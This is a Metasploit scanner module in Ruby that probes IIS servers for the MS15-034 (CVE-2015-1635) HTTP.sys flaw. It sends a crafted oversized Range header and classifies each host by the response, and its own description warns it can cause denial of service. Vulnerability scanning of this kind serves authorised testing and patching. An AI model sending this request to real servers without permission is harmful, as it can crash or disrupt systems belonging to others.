##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS15-034 HTTP Protocol Stack Request Handling Vulnerability',
      'Description'    => %q{
        This module will check if your hosts are vulnerable to CVE-2015-1635 (MS15-034). A
        vulnerability in the HTTP Protocol stack (HTTP.sys) that could result in arbitrary code
        execution. Please note this module could potentially cause a denail-of-service against
        the servers you're testing.
      },
      'Author'         =>
        [
          'Bill Finlayson', # He did all the work (see the pastebin code), twitter: @hectorh56193716
          'sinn3r'          # MSF version of bill's work
        ],
      'References'     =>
        [
          ['CVE', '2015-1635'],
          ['MSB', 'MS15-034'],
          ['URL', 'http://pastebin.com/ypURDPc4']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path', '/'])
      ], self.class)

    deregister_options('RHOST')
  end

  def run_host(ip)
    code = check_host(ip)
    case code
    when Exploit::CheckCode::Vulnerable
      print_good("#{ip}:#{rport} - #{code.last}")
    else
      print_status("#{ip}:#{rport} - #{code.last}")
    end
  end

  def check_host(ip)
    uri = normalize_uri(target_uri.path)

    res = send_request_raw({'uri'=>uri})

    unless res
      vprint_error("#{ip}:#{rport} - Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    if res.code == 404
      print_error("#{ip}:#{rport} - URI must be a valid resource")
      return
    end

    if !res.headers['Server'].include?('Microsoft-IIS')
      vprint_error("#{ip}:#{rport} - Target isn't IIS")
      return Exploit::CheckCode::Safe
    end

    res = send_request_raw({
      'uri' => uri,
      'method' => 'GET',
      'vhost'  => 'stuff',
      'headers' => {
        'Range' => 'bytes=0-18446744073709551615'
      }
    })
    if res && res.body.include?('Requested Range Not Satisfiable')
      return Exploit::CheckCode::Vulnerable
    elsif res && res.body.include?('The request has an invalid header name')
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Unknown
    end
  end

end
